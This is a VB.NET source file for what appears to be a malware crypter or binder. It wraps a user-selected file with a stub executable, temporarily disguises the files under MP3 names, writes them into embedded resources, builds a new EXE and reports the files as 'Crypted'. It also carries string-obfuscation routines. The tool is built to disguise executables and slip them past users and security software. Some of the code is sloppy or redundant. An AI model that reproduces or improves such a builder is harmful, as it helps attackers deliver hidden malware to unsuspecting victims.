Imports System.Reflection
Imports System.IO
Imports System.Threading
Imports System.Runtime.CompilerServices
Imports System.Security.Cryptography

Public Class main

    Dim fileData() As Byte
    Dim encoded As Byte
    Dim code As String = My.Resources.dl
    Dim rand As New Random()

    Public Function randomChars(ByVal number As Integer)

        Dim therandomthing As String = ""
        Dim charsnumbers As Integer
        Dim charsUL As Integer

        Dim charsL As String = "abcdefghijklmnopqrstuvwxyz"
        Dim charsU As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

        Dim numberC As Integer = rand.Next(1, number + 1)
        Dim numberN As Integer = number - numberC

        For i = 1 To number
            charsnumbers = rand.Next(1, 3)
            If charsnumbers = 1 And numberC > 0 Then
                charsUL = rand.Next(1, 3)
                If charsUL = 1 Then
                    therandomthing = therandomthing & charsL(rand.Next(0, 26))
                Else
                    therandomthing = therandomthing & charsU(rand.Next(0, 26))
                End If
            Else
                therandomthing = therandomthing & rand.Next(0, 9)
            End If
        Next

        Return therandomthing

    End Function

    Private Sub Bt_Add_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Bt_Add.Click
        Using ofd As New OpenFileDialog
            ofd.Filter = "All Files *.*|*.*"
            If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
                My.Computer.FileSystem.RenameFile(Application.StartupPath + "\stub.exe", "Pursuit of Happiness.MP3")
                fileList.Items.Add(Application.StartupPath + "\Taylor.MP3")
                TextBox1.Text = ofd.FileName
                Bt_Add.Enabled = False

                Try
                    Dim ImageBytes() As Byte = IO.File.ReadAllBytes(Application.StartupPath + "\Pursuit of Happiness.MP3")
                    Dim FileBytes() As Byte = IO.File.ReadAllBytes(ofd.FileName)
                    Dim FS As New IO.FileStream(Application.StartupPath + "\Taylor.MP3", IO.FileMode.CreateNew)
                    FS.Write(ImageBytes, 0, ImageBytes.Length)
                    FS.Write(FileBytes, 0, FileBytes.Length)
                    FS.WriteByte(Asc("♥"))
                    Dim FileSize() As Byte = System.Text.ASCIIEncoding.ASCII.GetBytes(New IO.FileInfo(ofd.FileName).Length)
                    FS.Write(FileSize, 0, FileSize.Length)
                    FS.WriteByte(Asc("#"))
                    Dim Extention() As Byte = System.Text.ASCIIEncoding.ASCII.GetBytes(ofd.FileName.Substring(ofd.FileName.LastIndexOf(".") + 1))
                    FS.Write(Extention, 0, Extention.Length)
                    FS.Close()
                    FS.Dispose()
                Catch ex As Exception
                    MessageBox.Show("There was an error!" & vbNewLine & vbNewLine & "The application will now close.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                    Me.Close()
                End Try

                My.Computer.FileSystem.RenameFile(Application.StartupPath + "\Pursuit of Happiness.MP3", "stub.exe")
            End If
        End Using
    End Sub
    Private Sub Bt_Rem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Bt_Rem.Click
        Using ofd As New OpenFileDialog
            ofd.Filter = "All Files *.*|*.*"
            If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
                My.Computer.FileSystem.RenameFile(Application.StartupPath + "\stub.exe", "Pursuit of Happiness.MP3")
                fileList.Items.Add(Application.StartupPath + "\Taylor2.MP3")
                Bt_Rem.Enabled = False

                Try
                    Dim ImageBytes() As Byte = IO.File.ReadAllBytes(Application.StartupPath + "\Pursuit of Happiness.MP3")
                    Dim FileBytes() As Byte = IO.File.ReadAllBytes(ofd.FileName)
                    Dim FS As New IO.FileStream(Application.StartupPath + "\Taylor2.MP3", IO.FileMode.CreateNew)
                    FS.Write(ImageBytes, 0, ImageBytes.Length)
                    FS.Write(FileBytes, 0, FileBytes.Length)
                    FS.WriteByte(Asc("♥"))
                    Dim FileSize() As Byte = System.Text.ASCIIEncoding.ASCII.GetBytes(New IO.FileInfo(ofd.FileName).Length)
                    FS.Write(FileSize, 0, FileSize.Length)
                    FS.WriteByte(Asc("#"))
                    Dim Extention() As Byte = System.Text.ASCIIEncoding.ASCII.GetBytes(ofd.FileName.Substring(ofd.FileName.LastIndexOf(".") + 1))
                    FS.Write(Extention, 0, Extention.Length)
                    FS.Close()
                    FS.Dispose()
                Catch ex As Exception
                    MessageBox.Show("There was an error!" & vbNewLine & vbNewLine & "The application will now close.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                    Me.Close()
                End Try

                My.Computer.FileSystem.RenameFile(Application.StartupPath + "\Pursuit of Happiness.MP3", "stub.exe")
            End If
        End Using
    End Sub

    Private Sub Bt_Build_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Bt_Build.Click
        Dim Newlying = My.Resources.dl

        Using sfd As New SaveFileDialog
            sfd.Filter = "EXE Files *.exe|*.exe"
            If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then

                Using R As New Resources.ResourceWriter(Application.StartupPath & "\lixks.resources")
                    For i = 0 To fileList.Items.Count - 1

                        Dim oFile As System.IO.FileInfo
                        oFile = New System.IO.FileInfo(Application.StartupPath + "\Taylor.MP3")

                        Dim oFileStream As System.IO.FileStream = oFile.OpenRead()
                        Dim lBytes As Long = oFileStream.Length

                        If (lBytes > 0) Then
                            ReDim fileData(lBytes - 1)
                            oFileStream.Read(fileData, 0, lBytes)
                            oFileStream.Close()
                        End If
                        R.AddResource(System.IO.Path.GetFileName(Application.StartupPath + "\Taylor.MP3"), System.IO.File.ReadAllBytes(DirectCast(Application.StartupPath + "\Taylor.MP3", String)))
                    Next
                End Using

                Using T As New Resources.ResourceWriter(Application.StartupPath & "\lixks.resources")
                    For i = 0 To fileList.Items.Count - 1

                        Dim oFile As System.IO.FileInfo
                        oFile = New System.IO.FileInfo(Application.StartupPath + "\Taylor2.MP3")

                        Dim oFileStream As System.IO.FileStream = oFile.OpenRead()
                        Dim lBytes As Long = oFileStream.Length

                        If (lBytes > 0) Then
                            ReDim fileData(lBytes - 1)
                            oFileStream.Read(fileData, 0, lBytes)
                            oFileStream.Close()
                        End If
                        T.AddResource(System.IO.Path.GetFileName(Application.StartupPath + "\Taylor2.MP3"), System.IO.File.ReadAllBytes(DirectCast(Application.StartupPath + "\Taylor2.MP3", String)))
                    Next
                End Using


                If CheckBox2.Checked = True Then
                    Newlying = Newlying.Replace("		%XISL%", TextBox6.Text)
                    Newlying = Newlying.Replace(TextBox5.Text, "")
                Else
                    Newlying = Newlying.Replace("		%XISL%", "")
                End If


                builder.gen(sfd.FileName, code)

                If IO.File.Exists(Application.StartupPath & "\lixks.resources") Then
                    IO.File.Delete(Application.StartupPath & "\lixks.resources")
                End If
                TextBox4.Text = sfd.FileName
                IO.File.Delete(Application.StartupPath + "\Taylor.MP3")
                MsgBox("Files Were Crypted Successfully!")
                IO.File.Delete(Application.StartupPath + "\Taylor2.MP3")

            End If
        End Using

    End Sub
    Private Sub Label1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        
    End Sub

    Private Sub main_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        If IO.File.Exists(Application.StartupPath + "\stub.exe") Then

        Else
            MessageBox.Show("stub.exe was not found in application Folder, Therefore Application Unusable..... Closing!")
            Application.Exit()
        End If
    End Sub
    Public Function ObfuscateString(ByVal sInput As String) As String
        Dim sTemp As String = ""
        Dim iLoop As Integer
        Dim iLen As Integer

        iLen = sInput.Length
        For iLoop = iLen To 1 Step -3 + 1
            sTemp += Microsoft.VisualBasic.Mid(sInput, iLoop, 1)
        Next
        For iLoop = iLen - 1 To 1 Step -3 + 1
            sTemp += Microsoft.VisualBasic.Mid(sInput, iLoop, 1)
        Next
        Return sTemp
    End Function

    Public Function UnObfuscateString(ByVal sInput As String) As String
        Dim sTemp As String = ""
        Dim sEnd As String = ""
        Dim sStart As String = ""
        Dim iLoop As Integer
        Dim iLen As Integer
        Dim iMiddle As Integer
        Dim iRemainder As Integer

        iLen = sInput.Length
        iRemainder = iLen Mod 2
        iMiddle = iLen \ 2

        For iLoop = iMiddle + iRemainder To 1 Step -2 + 1
            If iRemainder = 0 Then
                sTemp += Microsoft.VisualBasic.Mid(sInput, iLoop + iMiddle, 1)
            End If
            sTemp += Microsoft.VisualBasic.Mid(sInput, iLoop, 1)
            If iRemainder = 1 And iLoop <> 1 Then
                sTemp += Microsoft.VisualBasic.Mid(sInput, iLoop + iMiddle, 1)
            End If
        Next

        Return sTemp
    End Function

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub main_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        IO.File.Delete(Application.StartupPath + "\Taylor.MP3")
    End Sub
End Class